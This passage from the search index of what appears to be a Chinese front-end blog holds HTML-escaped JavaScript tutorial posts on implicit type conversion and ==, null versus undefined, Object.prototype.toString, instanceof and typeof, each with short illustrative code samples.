const a = true
if (a) {

}
const b = 100
if (b) {

}

// false变量
const c = &#39;&#39;
if (c) {

}
const d = null
if (d) {

}
let e
if (e) {
  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;逻辑判断&#34;&gt;逻辑判断&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 逻辑判断
console.log(10 &amp;amp;&amp;amp; 0) // 0
console.log(&#39;&#39; || &#39;abc&#39;) // &#39;abc&#39;
console.log(!window.abc) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;各种数学运算符&#34;&gt;各种数学运算符&lt;/h3&gt;
&lt;h4 id=&#34;数学运算符-&#34;&gt;数学运算符(&lt;code&gt;- * /&lt;/code&gt;)&lt;/h4&gt;
&lt;p&gt;我们在对各种非&lt;code&gt;Number&lt;/code&gt;类型运用数学运算符(&lt;code&gt;- * /&lt;/code&gt;)时，会先将非&lt;code&gt;Number&lt;/code&gt;类型转换为&lt;code&gt;Number&lt;/code&gt;类型;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;1 - true // 0
1 - null //  1
1 * undefined //  NaN
2 * [&#39;5&#39;] //  10
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;操作符&#34;&gt;&lt;code&gt;+&lt;/code&gt;操作符&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;1.当一侧为&lt;code&gt;String&lt;/code&gt;类型，被识别为字符串拼接，并会优先将另一侧转换为字符串类型。&lt;/li&gt;
&lt;li&gt;2.当一侧为&lt;code&gt;Number&lt;/code&gt;类型，另一侧为原始类型，则将原始类型转换为&lt;code&gt;Number&lt;/code&gt;类型。&lt;/li&gt;
&lt;li&gt;3.当一侧为&lt;code&gt;Number&lt;/code&gt;类型，另一侧为引用类型，将引用类型和&lt;code&gt;Number&lt;/code&gt;类型转换成字符串后拼接。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;123 + &#39;123&#39; // 123123   （规则1）
123 + null  // 123    （规则2）
123 + true // 124    （规则2）
123 + {}  // 123[object Object]    （规则3）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;&#34;&gt;==&lt;/h3&gt;
&lt;p&gt;使用&lt;code&gt;==&lt;/code&gt;时，若两侧类型相同，则比较结果和&lt;code&gt;===&lt;/code&gt;相同，否则会发生隐式转换，使用&lt;code&gt;==&lt;/code&gt;时发生的转换可以分为几种不同的情况（只考虑两侧类型不同）：&lt;/p&gt;
&lt;h4 id=&#34;nan&#34;&gt;NaN&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;NaN&lt;/code&gt;和其他任何类型比较永远返回&lt;code&gt;false&lt;/code&gt;(包括和他自己)。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;NaN == NaN // false
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;boolean&#34;&gt;Boolean&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Boolean&lt;/code&gt;和其他任何类型比较，&lt;code&gt;Boolean&lt;/code&gt;首先被转换为&lt;code&gt;Number&lt;/code&gt;类型。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;true == 1  // true 
true == &#39;2&#39;  // false
true == [&#39;1&#39;]  // true
true == [&#39;2&#39;]  // false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里注意一个可能会弄混的点：&lt;code&gt;undefined、null&lt;/code&gt;和&lt;code&gt;Boolean&lt;/code&gt;比较，虽然&lt;code&gt;undefined、null&lt;/code&gt;和&lt;code&gt;false&lt;/code&gt;都很容易被想象成假值，但是他们比较结果是&lt;code&gt;false&lt;/code&gt;，原因是&lt;code&gt;false&lt;/code&gt;首先被转换成&lt;code&gt;0&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;undefined == false // false
null == false // false
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;string和number&#34;&gt;String和Number&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;String&lt;/code&gt;和&lt;code&gt;Number&lt;/code&gt;比较，先将&lt;code&gt;String&lt;/code&gt;转换为&lt;code&gt;Number&lt;/code&gt;类型。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;123 == &#39;123&#39; // true
&#39;&#39; == 0 // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;null和undefined&#34;&gt;null和undefined&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;null == undefined&lt;/code&gt;比较结果是&lt;code&gt;true&lt;/code&gt;，除此之外，&lt;code&gt;null、undefined&lt;/code&gt;和其他任何结果的比较值都为&lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;null == undefined // true
null == &#39;&#39; // false
null == 0 // false
null == false // false
undefined == &#39;&#39; // false
undefined == 0 // false
undefined == false // false
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;原始类型和引用类型&#34;&gt;原始类型和引用类型&lt;/h4&gt;
&lt;p&gt;当原始类型和引用类型做比较时，对象类型会依照&lt;code&gt;ToPrimitive&lt;/code&gt;规则转换为原始类型:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  &#39;[object Object]&#39; == {} // true
  &#39;1,2,3&#39; == [1, 2, 3] // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;来看看下面这个比较：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;[] == ![] // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;!&lt;/code&gt;的优先级高于&lt;code&gt;==&lt;/code&gt;，&lt;code&gt;![]&lt;/code&gt;首先会被转换为&lt;code&gt;false&lt;/code&gt;，然后根据上面第三点，&lt;code&gt;false&lt;/code&gt;转换成&lt;code&gt;Number&lt;/code&gt;类型&lt;code&gt;0&lt;/code&gt;，左侧&lt;code&gt;[]&lt;/code&gt;转换为&lt;code&gt;0&lt;/code&gt;，两侧比较相等。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;[null] == false // true
[undefined] == false // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据数组的&lt;code&gt;ToPrimitive&lt;/code&gt;规则，数组元素为&lt;code&gt;null&lt;/code&gt;或&lt;code&gt;undefined&lt;/code&gt;时，该元素被当做空字符串处理，所以&lt;code&gt;[null]、[undefined]&lt;/code&gt;都会被转换为&lt;code&gt;0&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;何时使用&#34;&gt;何时使用&lt;/h4&gt;
&lt;p&gt;除了 == null 之外，其他都一律使用 ===&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const obj = { x: 100 }
if (obj.a == null) { }
// 相当于：
// if (obj.a === null || obj.a === undefined) { }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.conardli.top/blog/article/JS%E8%BF%9B%E9%98%B6/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%8E%8C%E6%8F%A1%E5%8F%98%E9%87%8F%E5%92%8C%E7%B1%BB%E5%9E%8B%E4%BA%86%E5%90%97%EF%BC%88%E4%BA%8C%EF%BC%89%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html#%E4%B8%83%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2&#34;&gt;类型转换&lt;/a&gt;&lt;/p&gt;
">91-js-7-隐式类型转换</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-null-he-undefined/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;null&lt;/code&gt;与&lt;code&gt;undefined&lt;/code&gt;都可以表示“没有”，含义非常相似。将一个变量赋值为&lt;code&gt;undefined&lt;/code&gt;或&lt;code&gt;null&lt;/code&gt;，老实说，语法效果几乎没区别。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var a = undefined;
// 或者
var a = null;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，变量&lt;code&gt;a&lt;/code&gt;分别被赋值为&lt;code&gt;undefined&lt;/code&gt;和&lt;code&gt;null&lt;/code&gt;，这两种写法的效果几乎等价。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;if&lt;/code&gt;语句中，它们都会被自动转为&lt;code&gt;false&lt;/code&gt;，相等运算符（&lt;code&gt;==&lt;/code&gt;）甚至直接报告两者相等。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (!undefined) {
  console.log(&#39;undefined is false&#39;);
}
// undefined is false

if (!null) {
  console.log(&#39;null is false&#39;);
}
// null is false

undefined == null
// true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。&lt;/p&gt;
&lt;p&gt;1995年 JavaScript 诞生时，最初像 Java 一样，只设置了&lt;code&gt;null&lt;/code&gt;表示&amp;quot;无&amp;quot;。根据 C 语言的传统，&lt;code&gt;null&lt;/code&gt;可以自动转为&lt;code&gt;0&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Number(null) // 0
5 + null // 5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;null&lt;/code&gt;转为数字时，自动变成0。&lt;/p&gt;
&lt;p&gt;但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面，&lt;code&gt;null&lt;/code&gt;就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果&lt;code&gt;null&lt;/code&gt;自动转为0，很不容易发现错误。&lt;/p&gt;
&lt;p&gt;因此，他又设计了一个&lt;code&gt;undefined&lt;/code&gt;。区别是这样的：&lt;code&gt;null&lt;/code&gt;是一个表示“空”的对象，转为数值时为&lt;code&gt;0&lt;/code&gt;；&lt;code&gt;undefined&lt;/code&gt;是一个表示&amp;quot;此处无定义&amp;quot;的原始值，转为数值时为&lt;code&gt;NaN&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Number(undefined) // NaN
5 + undefined // NaN
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;undefined&#34;&gt;undefined&lt;/h2&gt;
&lt;h3 id=&#34;重新赋值与void-0&#34;&gt;重新赋值与void 0&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么有的编程规范要求用 void 0 代替 undefined？&lt;/p&gt;
&lt;p&gt;这个语言也定义了一个全局变量，它的值是 &lt;code&gt;undefined&lt;/code&gt;，这个变量也被称为 &lt;code&gt;undefined&lt;/code&gt;。 但是这个变量&lt;strong&gt;不是&lt;/strong&gt;一个常量，也不是一个关键字。这意味着它的&lt;em&gt;值&lt;/em&gt;可以轻易被覆盖。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Undefined 类型表示未定义，它的类型只有一个值，就是 undefined。任何变量在赋值前是 Undefined 类型、值为 undefined，一般我们可以用全局变量 undefined（就是名为 undefined 的这个变量）来表达这个值，或者 void 运算来把任意一个表达式变成 undefined 值。&lt;/p&gt;
&lt;p&gt;但是呢，因为 JavaScript 的代码 undefined 是一个变量，而并非是一个关键字，这是 JavaScript 语言公认的设计失误之一，所以，我们为了避免无意中被篡改，我建议使用 void 0 来获取 undefined 值。&lt;/p&gt;
&lt;p&gt;我实际验证了一下，全局变量中无法被赋值，但在函数作用域中可以被赋值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 全局作用域
var undefined = 123
console.log(undefined) // undefined

// 函数作用域
(function(){
  var undefined = 123
  console.log(undefined) // 123
})()

function part() {
  var undefined = 123
  console.log(undefined) // 123
}
part()

// void 0
(function(){  
  console.log(void 0) // undefined
})()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;返回undefined的情况&#34;&gt;返回undefined的情况&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;访问未修改的全局变量 &lt;code&gt;undefined&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;由于没有定义 &lt;code&gt;return&lt;/code&gt; 表达式的函数隐式返回。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;return&lt;/code&gt; 表达式没有显式的返回任何内容。&lt;/li&gt;
&lt;li&gt;访问不存在的属性。&lt;/li&gt;
&lt;li&gt;函数参数没有被显式的传递值。&lt;/li&gt;
&lt;li&gt;任何被设置为 &lt;code&gt;undefined&lt;/code&gt; 值的变量。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 变量声明了，但没有赋值
var i;
i // undefined

// 调用函数时，应该提供的参数没有提供，该参数等于 undefined
function f(x) {
  return x;
}
f() // undefined

// 对象没有赋值的属性
var  o = new Object();
o.p // undefined

// 函数没有返回值时，默认返回 undefined
function f() {}
f() // undefined
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;null&#34;&gt;null&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;null&lt;/code&gt;表示空值，即该处的值现在为空。&lt;/p&gt;
&lt;p&gt;**调用函数时，某个参数未设置任何值，这时就可以传入&lt;code&gt;null&lt;/code&gt;，表示该参数为空。**比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入&lt;code&gt;null&lt;/code&gt;，表示未发生错误。&lt;/p&gt;
&lt;h2 id=&#34;区别&#34;&gt;区别&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;undefined表示“缺少值”，即此处应有一个值，但还没有定义。&lt;/p&gt;
&lt;p&gt;null表示被赋值过的对象，刻意把一个对象赋值为&lt;code&gt;null&lt;/code&gt;，故意表示其为空，不应有值。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;undefined转为数值时为&lt;code&gt;NaN&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;null转换为数值时值为0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#core.undefined&#34;&gt;JavaScript秘密花园&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wangdoc.com/javascript/types/null-undefined-boolean.html&#34;&gt;阮一峰&lt;/a&gt;&lt;/p&gt;
">90-js-6-null和undefined</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-objectprototypetostring-fang-fa/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;JavaScript 标准文档只给出了一种获取 &lt;code&gt;[[Class]]&lt;/code&gt; 值的方法，那就是使用 &lt;code&gt;Object.prototype.toString&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;javascript-类型表格&#34;&gt;JavaScript 类型表格&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Value               Class      Type
-------------------------------------
&amp;quot;foo&amp;quot;               String     string
new String(&amp;quot;foo&amp;quot;)   String     object
1.2                 Number     number
new Number(1.2)     Number     object
true                Boolean    boolean
new Boolean(true)   Boolean    object
new Date()          Date       object
new Error()         Error      object
[1,2,3]             Array      object
new Array(1, 2, 3)  Array      object
new Function(&amp;quot;&amp;quot;)    Function   function
/abc/g              RegExp     object (function in Nitro/V8)
new RegExp(&amp;quot;meow&amp;quot;)  RegExp     object (function in Nitro/V8)
{}                  Object     object
new Object()        Object     object
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面表格中，&lt;em&gt;Type&lt;/em&gt; 一列表示 &lt;code&gt;typeof&lt;/code&gt; 操作符的运算结果。可以看到，这个值在大多数情况下都返回 &amp;quot;object&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Class&lt;/em&gt; 一列表示对象的内部属性 &lt;code&gt;[[Class]]&lt;/code&gt; 的值。&lt;/p&gt;
&lt;p&gt;为了获取对象的 &lt;code&gt;[[Class]]&lt;/code&gt;，我们需要使用定义在 &lt;code&gt;Object.prototype&lt;/code&gt; 上的方法 &lt;code&gt;toString&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;类型&#34;&gt;类型&lt;/h2&gt;
&lt;h3 id=&#34;基本类型&#34;&gt;基本类型&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;基本类型&lt;/th&gt;
&lt;th&gt;返回值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Boolean&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Boolean]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Number&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Number]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;String&lt;/td&gt;
&lt;td&gt;&amp;quot;[object String]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Undefined&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Undefined]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Null&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Null]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Symbol&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Symbol]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Object.prototype.toString.call(true) === &amp;quot;[object Boolean]&amp;quot;
Object.prototype.toString.call(1) === &amp;quot;[object Number]&amp;quot;
Object.prototype.toString.call(&amp;quot;a&amp;quot;) === &amp;quot;[object String]&amp;quot;
Object.prototype.toString.call(undefined) === &amp;quot;[object Undefined]&amp;quot; 
Object.prototype.toString.call(null) === &amp;quot;[object Null]&amp;quot;
Object.prototype.toString.call(Symbol()) === &amp;quot;[object Symbol]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;引用类型&#34;&gt;引用类型&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;引用类型&lt;/th&gt;
&lt;th&gt;返回值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Function&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Function]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Array&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Array]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Date&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Date]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RegExp&lt;/td&gt;
&lt;td&gt;&amp;quot;[object RegExp]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Object&lt;/td&gt;
&lt;td&gt;&amp;quot;[object Object]&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Object.prototype.toString.call(function(){}) === &amp;quot;[object Function]&amp;quot;
Object.prototype.toString.call([]) === &amp;quot;[object Array]&amp;quot;
Object.prototype.toString.call(new Date()) === &amp;quot;[object Date]&amp;quot;
Object.prototype.toString.call(new RegExp(&#39;^http://&#39;)) === &amp;quot;[object RegExp]&amp;quot;
Object.prototype.toString.call({}) === &amp;quot;[object Object]&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function is(type, obj) {
    var clas = Object.prototype.toString.call(obj).slice(8, -1);
    return obj !== undefined &amp;amp;&amp;amp; obj !== null &amp;amp;&amp;amp; clas === type;
}

is(&#39;String&#39;, &#39;test&#39;); // true
is(&#39;String&#39;, new String(&#39;test&#39;)); // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面例子中，&lt;code&gt;Object.prototype.toString&lt;/code&gt; 方法被调用，this 被设置为了需要获取 &lt;code&gt;[[Class]]&lt;/code&gt; 值的对象。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.prototype.toString&lt;/code&gt; 返回一种标准格式字符串，所以上例可以通过 &lt;code&gt;slice&lt;/code&gt; 截取指定位置的字符串，如下所示：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Object.prototype.toString.call([])    // &amp;quot;[object Array]&amp;quot;
Object.prototype.toString.call({})    // &amp;quot;[object Object]&amp;quot;
Object.prototype.toString.call(2)    // &amp;quot;[object Number]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论&lt;/h2&gt;
&lt;p&gt;为了检测一个对象的类型，强烈推荐使用 &lt;code&gt;Object.prototype.toString&lt;/code&gt; 方法； 因为这是唯一一个可依赖的方式。正如上面表格所示，&lt;code&gt;typeof&lt;/code&gt; 的一些返回值在标准文档中并未定义， 因此不同的引擎实现可能不同。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#types.typeof&#34;&gt;Object.prototype.toString&lt;/a&gt;&lt;/p&gt;
">89-js-5-Object.prototype.toString方法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-instanceof-yun-suan-fu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;instanceof&lt;/code&gt; 操作符用来比较两个操作数的构造函数。只有在比较自定义的对象时才有意义。 如果用来比较内置类型，将会和 &lt;code&gt;typeof&lt;/code&gt; 操作符一样用处不大。&lt;/p&gt;
&lt;h2 id=&#34;作用&#34;&gt;作用&lt;/h2&gt;
&lt;h3 id=&#34;比较自定义对象&#34;&gt;比较自定义对象&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Foo() {}
function Bar() {}
Bar.prototype = new Foo();

new Bar() instanceof Bar; // true
new Bar() instanceof Foo; // true

// 如果仅仅设置 Bar.prototype 为函数 Foo 本身，而不是 Foo 构造函数的一个实例
Bar.prototype = Foo;
new Bar() instanceof Foo; // false
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;instanceof-比较内置类型&#34;&gt;&lt;code&gt;instanceof&lt;/code&gt; 比较内置类型&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;new String(&#39;foo&#39;) instanceof String; // true
new String(&#39;foo&#39;) instanceof Object; // true

&#39;foo&#39; instanceof String; // false
&#39;foo&#39; instanceof Object; // false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有一点需要注意，&lt;code&gt;instanceof&lt;/code&gt; 用来比较属于不同 JavaScript 上下文的对象（比如，浏览器中不同的文档结构）时将会出错， 因为它们的构造函数不会是同一个对象。&lt;/p&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;instanceof&lt;/code&gt; 操作符应该&lt;strong&gt;仅仅&lt;/strong&gt;用来比较来自同一个 JavaScript 上下文的自定义对象。 正如 &lt;code&gt;typeof&lt;/code&gt;操作符一样，任何其它的用法都应该是避免的。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://bonsaiden.github.io/JavaScript-Garden/zh/#types.instanceof&#34;&gt;instanceof 操作符&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof&#34;&gt;MDN-instanceof&lt;/a&gt;&lt;/p&gt;
">88-js-4-instanceof运算符</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-typeof-yun-suan-fu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;JavaScript 有三种方法，可以确定一个值到底是什么类型。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;typeof&lt;/code&gt;运算符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;instanceof&lt;/code&gt;运算符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Object.prototype.toString&lt;/code&gt;方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;typeof&lt;/code&gt;运算符可以返回一个值的数据类型。&lt;/p&gt;
&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;p&gt;它支持两种语法形式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;作为运算符：&lt;code&gt;typeof x&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;函数形式：&lt;code&gt;typeof(x)&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;案例&#34;&gt;案例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;typeof undefined // &amp;quot;undefined&amp;quot;

typeof 0 // &amp;quot;number&amp;quot;

typeof 10n // &amp;quot;bigint&amp;quot;

typeof true // &amp;quot;boolean&amp;quot;

typeof &amp;quot;foo&amp;quot; // &amp;quot;string&amp;quot;

typeof Symbol(&amp;quot;id&amp;quot;) // &amp;quot;symbol&amp;quot;

typeof Math // &amp;quot;object&amp;quot;  (1)

typeof null // &amp;quot;object&amp;quot;  (2)

typeof alert // &amp;quot;function&amp;quot;  (3)
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Math&lt;/code&gt; 是一个提供数学运算的内建 &lt;code&gt;object&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;null&lt;/code&gt;的类型是&lt;code&gt;object&lt;/code&gt;，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑&lt;code&gt;null&lt;/code&gt;，只把它当作&lt;code&gt;object&lt;/code&gt;的一种特殊值。后来&lt;code&gt;null&lt;/code&gt;独立出来，作为一种单独的数据类型，为了兼容以前的代码，&lt;code&gt;typeof null&lt;/code&gt;返回&lt;code&gt;object&lt;/code&gt;就没法改变了。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;typeof alert&lt;/code&gt; 的结果是 &lt;code&gt;&amp;quot;function&amp;quot;&lt;/code&gt;，因为 &lt;code&gt;alert&lt;/code&gt; 在 JavaScript 语言中是一个函数。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;用法&#34;&gt;用法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;typeof&lt;/code&gt; 只有一个实际的应用， 而这个应用却&lt;strong&gt;不是&lt;/strong&gt;用来检查对象的类型，这个实际应用是用来检测一个对象是否已经定义或者是否已经赋值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;v
// ReferenceError: v is not defined

typeof v
// &amp;quot;undefined&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，变量&lt;code&gt;v&lt;/code&gt;没有用&lt;code&gt;var&lt;/code&gt;命令声明，直接使用就会报错。但是，放在&lt;code&gt;typeof&lt;/code&gt;后面，就不报错了，而是返回&lt;code&gt;undefined&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;实际编程中，这个特点通常用在判断语句。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 错误的写法
if (v) {
  // ...
}
// ReferenceError: v is not defined

// 正确的写法
if (typeof v === &amp;quot;undefined&amp;quot;) {
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://wangdoc.com/javascript/types/general.html#typeof-%E8%BF%90%E7%AE%97%E7%AC%A6&#34;&gt;typeof 运算符&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zh.javascript.info/types#type-typeof&#34;&gt;typeof 运算符&lt;/a&gt;&lt;/p&gt;
